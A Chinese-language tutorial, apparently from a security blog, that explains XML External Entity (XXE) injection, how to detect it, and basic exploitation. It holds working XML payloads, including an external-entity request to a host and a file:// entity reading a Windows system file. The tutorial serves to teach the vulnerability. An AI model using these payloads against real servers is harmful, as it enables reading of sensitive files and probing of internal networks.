## 一、什么是XXE

XXE漏洞全称`XML External Entity Injection`即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，有了XML实体，关键字`SYSTEM`会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

## 二、如何判断XXE漏洞

最直接的方法就是通过修改HTTP请求方法，修改`Content-Type`头部字段等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE漏洞。

例如wsdl（web服务描述语言）,或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。

## 三、XXE漏洞的基本利用

通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。

### 1、检测XML是否会被解析

```
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY xxe "test">
]>
<user><username>&xxe;</username><password>123</password></user>
```

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/2/1630576005731.png?x-oss-process=style/ImageWaterMark_V1.0)

如果页面输出了test，说明xml文件可以被解析

### 2、检测服务器是否支持DTD引用外部实体

```
<?xml version=”1.0” encoding=”UTF-8”?> 
<!DOCTYPE ANY [ 
<!ENTITY % name SYSTEM "http://localhost/index.html"> 
%name; 
]>
```

可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html的请求

### 3、通过外部实体（file协议）读取文件

XML内容被解析后,使用`file协议`,文件内容便通过`&test`被存放在了XXE元素中，造成了敏感信息的泄露。

```
<?xml version="1.0"?>
<!DOCTYPE XXE [
<!ENTITY test SYSTEM  "file:///c:/windows/win.ini">
]>
<user><username>&test;</username><password>123</password></user>
```

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/2/1630572990423.png?x-oss-process=style/ImageWaterMark_V1.0)